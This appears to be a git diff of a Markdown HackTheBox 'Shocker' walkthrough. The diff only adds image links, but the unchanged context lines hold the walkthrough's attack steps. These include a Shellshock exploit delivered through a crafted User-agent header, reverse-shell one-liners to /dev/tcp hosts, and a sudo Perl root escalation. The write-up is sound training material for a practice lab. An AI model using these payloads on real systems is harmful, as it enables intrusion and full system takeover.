@@ -1,11 +1,11 @@
-# Shocker HTB(https://app.hackthebox.com/machines/108)
+# Shocker [HTB](https://app.hackthebox.com/machines/108)
 
-![shocker-01]()
+![shocker-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Shocker/img/shocker-01.png)
 
 
 Lets add the target to our `/etc/hosts` file:
 
-![hosts-02]()
+![hosts-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Shocker/img/hosts-02.png)
 
 
 Now we can use `nmap` to scan the target:
@@ -14,7 +14,7 @@ Now we can use `nmap` to scan the target:
 nmap -sC -sV -A -p- shocker.htb -oN nmap.result
 ```
 
-![nmap-res-03]()
+![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Shocker/img/nmap-res-03.png)
 
 We have the following:
 
@@ -29,7 +29,7 @@ Lets take a look at the web server and see what we can find.
 
 Lets open our browser and navigate towards `http://shocker.htb`
 
-![site-04]()
+![site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Shocker/img/site-04.png)
 
 Not much to see or do here, lets try directory busting:
 
@@ -37,7 +37,7 @@ Not much to see or do here, lets try directory busting:
 ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/common.txti:FUZZ  -u http://shocker.htb/FUZZ
 ```
 
-![ffuf-05]()
+![ffuf-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Shocker/img/ffuf-05.png)
 
 
 We can see we have a few interesting results. Primarly, the scan confirmed that CGI is enabled on the 
@@ -60,7 +60,7 @@ ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/dire
 txt -u http://shocker.htb/cgi-bin/FUZZ -e .cgi,.php,.sh,.py,.pl
 ```
 
-![script-06]()
+![script-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Shocker/img/script-06.png)
 
 
 We got something. Lets check if its vulnerable:
@@ -69,7 +69,7 @@ We got something. Lets check if its vulnerable:
 curl http://shocker.htb/cgi-bin/user.sh -i -H "User-agent: () { :;}; echo; echo pwned"
 ```
 
-![vuln-07]()
+![vuln-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Shocker/img/vuln-07.png)
 
 It is. Now we can use a one liner reverse shell to get access to the system. 
 
@@ -85,7 +85,7 @@ Exploit with:
 curl http://shocker.htb/cgi-bin/user.sh -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.117/443 0>&1"
 ```
 
-![shell-08]()
+![shell-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Shocker/img/shell-08.png)
 
 
 ## Privilege Escalation
@@ -96,7 +96,7 @@ Lets look for easy wins, like our `sudo` permissions:
 sudo -l
 ```
 
-![sudo-09]()
+![sudo-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Shocker/img/sudo-09.png)
 
 
 WE can see we are allowed to run Perl. If we can run a scripting language as root, escalation is fairly trivial:
@@ -105,7 +105,7 @@ WE can see we are allowed to run Perl. If we can run a scripting language as roo
 sudo perl -e 'exec "/bin/sh";'
 ```
 
-![root-10]()
+![root-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Shocker/img/root-10.png)
 
 
 From here we can setup another `nc` listener and upgrade this shell with:
@@ -114,5 +114,5 @@ From here we can setup another `nc` listener and upgrade this shell with:
 bash -i >& /dev/tcp/<kali-ip>/9001 0>&1
 ```
 
-![full-root-11]()
+![full-root-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Shocker/img/full-root-11.png)
 
